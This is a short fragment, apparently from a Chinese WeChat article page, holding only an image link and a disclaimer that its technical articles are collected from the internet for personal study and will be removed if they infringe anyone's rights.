![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声明：  
技术文章均收集于互联网，仅作为本人学习、记录使用。  
侵权删  
！  
！  
  
